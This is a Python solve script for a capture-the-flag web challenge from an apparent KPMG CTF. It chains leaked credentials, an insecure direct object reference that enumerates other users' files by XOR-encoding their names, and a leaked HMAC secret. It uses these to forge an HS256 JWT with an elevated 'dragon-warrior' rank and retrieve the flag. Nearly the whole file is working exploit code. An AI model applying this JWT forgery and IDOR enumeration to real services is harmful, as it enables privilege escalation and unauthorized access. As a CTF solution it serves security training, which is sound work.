#!/usr/bin/env python3
"""
The Dragon Warrior - KPMG CTF - full solve script
Target: http://kicyber-546e757ab467-the-dragon-warrior-0-0.chals.io
Chain:
  1. favicon.svg leaks credentials            -> po / skadoosh1
  2. Training Hall lesson ref = XOR("<name>") -> enumerate other names (IDOR)
  3. shifu's restricted file                  -> seal algo = HS256 / rank = dragon-warrior / /scroll
  4. Oogway leaks the hex signing phrase       -> JWT secret is the literal hex string
  5. Forge a JWT seal with rank dragon-warrior -> POST /api/dragon-seal/certify
  6. GET /api/scroll                           -> flag
"""
import base64, hashlib, hmac, http.cookiejar, json, ssl, sys, time, urllib.request

BASE = "https://kicyber-546e757ab467-the-dragon-warrior-0-0.chals.io"
JADE_KEY = b"jade-cipher-77"                       # from training lesson 1a0e
SECRET   = b"49c0c971bede5a3ccd988f8cf820e0378bbb64bb19e67f42"  # Oogway's "signing phrase"

# ---------------------------------------------------------------- url plumbing
ctx = ssl.create_default_context()
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(jar),
    urllib.request.HTTPSHandler(context=ctx),
)

def api(path, method="GET", body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + "/api" + path, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    try:
        r = opener.open(req, timeout=30)
        return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode())

# ---------------------------------------------------------------- jade cipher
def jade_enc(text: str) -> str:
    return bytes(b ^ JADE_KEY[i % len(JADE_KEY)] for i, b in enumerate(text.encode())).hex()

def jade_dec(token: str) -> str:
    data = bytes.fromhex(token)
    return bytes(b ^ JADE_KEY[i % len(JADE_KEY)] for i, b in enumerate(data)).decode(errors="replace")

def b64(x: bytes) -> str:
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()

def forge(rank: str, sub: str) -> str:
    now = int(time.time())
    h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64(json.dumps({"sub": sub, "rank": rank, "iat": now,
                        "exp": now + 86400, "iss": "jade-palace"},
                       separators=(",", ":")).encode())
    sig = b64(hmac.new(SECRET, (h + "." + p).encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"

def main():
    print("[1] login as po / skadoosh1")
    print("   ", api("/auth/login", "POST", {"username": "po", "password": "skadoosh1"}))

    print("[2] training-ref IDOR:  XOR('po') =", jade_enc("po"), " (== built-in ref 1a0e)")
    code, shifu = api("/training/lesson/" + jade_enc("shifu"))
    print("    shifu file ->", shifu.get("title"))

    print("[3] Oogway leaks signing phrase")
    code, wis = api("/oogway")
    phrase_line = next(w for w in wis["wisdom"] if "sound something like" in w)
    print("   ", phrase_line.split(":")[-1].strip())

    print("[4] forge dragon-warrior seal")
    _, mine = api("/dragon-seal/mine")
    sub = json.loads(base64.urlsafe_b64decode(mine["seal"].split(".")[1] + "=="))["sub"]
    seal = forge("dragon-warrior", sub)
    print("    seal =", seal)

    print("[5] certify seal")
    print("   ", api("/dragon-seal/certify", "POST", {"seal": seal}))

    print("[6] GET /api/scroll")
    code, out = api("/scroll")
    print("   ", out)
    print("\nFLAG:", out["flag"])

if __name__ == "__main__":
    main()
